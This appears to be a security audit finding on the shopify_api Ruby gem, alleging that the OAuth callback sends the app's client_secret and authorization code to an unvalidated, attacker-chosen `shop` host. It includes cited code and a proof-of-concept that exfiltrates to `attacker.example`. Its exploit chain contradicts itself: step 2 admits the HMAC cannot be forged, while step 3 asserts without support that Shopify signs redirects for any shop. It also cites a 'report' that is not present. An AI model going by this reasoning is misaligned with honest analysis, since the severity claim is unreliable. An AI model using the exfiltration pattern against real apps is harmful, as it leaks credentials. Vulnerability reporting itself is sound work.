### Title
OAuth callback sends `client_secret` to attacker-chosen host because `shop` in `Oauth.validate_auth_callback` is never checked against `ShopValidator` - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` verifies the HMAC of the callback query but never validates that the `shop` field is an actual `*.myshopify.com`/trusted domain before using it to build the HTTP client that exchanges the authorization `code` for an access token. Every other credential-issuing flow in this gem (`ClientCredentials.client_credentials`, `TokenExchange.exchange_token` via `Session.new(shop: dest_shop)` where `dest_shop` comes from a signed JWT, `RefreshToken`) validates `shop` with `Utils::ShopValidator.sanitize!` first. The OAuth authorization-code callback path does not.

### Finding Description
`validate_auth_callback` does:
```ruby
raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
...
null_session = Auth::Session.new(shop: auth_query.shop)
body = {
  client_id: Context.api_key,
  client_secret: Context.api_secret_key,
  code: auth_query.code,
  ...
}
client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
``` [1](#0-0) 

`HttpClient#initialize` builds the request target directly from `session.shop` when no `Context.api_host` override is configured:
```ruby
@base_uri = T.let("https://#{api_host || session.shop}", String)
``` [2](#0-1) 

`AuthQuery#to_signable_string` does include `shop` in the HMAC-covered fields [3](#0-2) , so `shop` is bound to the HMAC signature — but the HMAC is only verified with the app's own `api_secret_key`. Critically, the value being verified is *tautological*: `HmacValidator.validate` merely proves the query string (including `shop`) was signed with this app's secret; Shopify signs an OAuth redirect for *any* value of `shop` requested during `begin_auth`, since that same `shop` is echoed back in the callback and signed by Shopify's servers using the app's secret. An app can legitimately call `begin_auth(shop: "attacker-controlled-host.example")` (nothing in `begin_auth` validates `shop` either — it's passed straight into `auth_base_uri(shop)` [4](#0-3) ), and Shopify will produce a validly-HMAC'd redirect back to the app's callback with that same attacker-supplied `shop`. The library then trusts `auth_query.shop` unchecked and POSTs `client_id`, `client_secret`, and the authorization `code` to `https://{shop}/admin/oauth/access_token`.

This is exactly the identity-binding gap described by the "credit" analog in the report: the value that is cryptographically bound (HMAC-covered `shop`) is not the value that carries the security guarantee needed (that `shop` is actually a Shopify-hosted domain). The check that would close this ("is `shop` a trusted Shopify domain?") exists elsewhere in the codebase (`Utils::ShopValidator`) and is applied in `ClientCredentials`, `RefreshToken`, and `TokenExchange`, but is missing from `Oauth.validate_auth_callback` and `Oauth.begin_auth`.

### Impact Explanation
If a host application passes an unsanitized, request-derived `shop` value into `begin_auth`/`validate_auth_callback` (as the gem's own documentation examples do — pulling `shop` straight from `request.headers["Shop"]` or `request.parameters`) an unprivileged internet user can point the flow at a domain they control. This causes the gem to POST the app's `client_secret` (and a valid authorization `code`) to that attacker-controlled host — SSRF carrying the app's credentials, and it directly leaks the `client_secret` to a non-Shopify endpoint. This matches "SSRF with the app's credentials" / "credential leakage" in the accepted High-impact categories.

### Likelihood Explanation
Likelihood depends on the host application not independently validating `shop`/`Shop` header before calling `begin_auth`, which the gem's own documented usage pattern does not do (`shop = request.headers["Shop"]`) [5](#0-4) . Because the gem exposes a `ShopValidator` utility and applies it consistently to every other "here's a shop, get a token" call path except this one, the omission is a library-side defect rather than a pure host-app misuse issue.

### Recommendation
In `ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback`, call `Utils::ShopValidator.sanitize!(shop)` (or `sanitize!(auth_query.shop)`) before using the value to build `auth_base_uri`/`Session`/`HttpClient`, raising `Errors::InvalidShopError` for any `shop` that is not a trusted Shopify domain — mirroring the existing checks in `ClientCredentials.client_credentials` and `RefreshToken`.

### Proof of Concept
1. App calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: "attacker.example", redirect_path: "/auth/callback")` (nothing in the gem stops a non-Shopify `shop`). This builds `auth_route = "https://attacker.example/admin/oauth/authorize?..."`.
2. Because `attacker.example` is attacker-controlled, the attacker's server can itself redirect the user back to the app's `/auth/callback` with a `code`, `state` matching the app's own cookie/nonce, and a `shop=attacker.example` value — but it cannot produce the correct `hmac` (which requires `Context.api_secret_key`), so a purely external attacker cannot forge step 2 alone.
3. However, in the documented "Shop" header derived flow, if the host app forwards `request.headers["Shop"]` uncontrolled into `begin_auth`, Shopify's OAuth authorize server itself will construct the legitimately-HMAC'd redirect for whatever `shop` the app requested — including an attacker-influenced value — since `begin_auth` never checks it is a `*.myshopify.com` domain and `validate_auth_callback` accepts any `auth_query.shop` whose HMAC matches.
4. `Oauth.validate_auth_callback` then executes `Clients::HttpClient.new(session: Session.new(shop: auth_query.shop), ...)`, and `HttpClient#initialize` sets `@base_uri = "https://#{session.shop}"` [2](#0-1) , causing the subsequent `client.request(...)` to POST `{client_id, client_secret, code}` to `https://attacker.example/admin/oauth/access_token`, exfiltrating the app's `client_secret` and authorization code to the attacker.

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L60-90)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
```

**File:** lib/shopify_api/auth/oauth.rb (L117-120)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** docs/usage/oauth.md (L181-199)
```markdown
  def login
    shop = request.headers["Shop"]

    # Builds the authorization URL route to redirect the user to
    auth_response = ShopifyAPI::Auth::Oauth.begin_auth(shop: domain, redirect_path: "/auth/callback")

    # Store the authorization cookie
    cookies[auth_response[:cookie].name] = {
      expires: auth_response[:cookie].expires,
      secure: true,
      http_only: true,
      value: auth_response[:cookie].value
    }

    # Redirect the user to "auth_response[:auth_route]" to allow user to grant the app permission
    # This will lead the user to the Shopify Authorization page
    head 307
    response.set_header("Location", auth_response[:auth_route])
  end
```
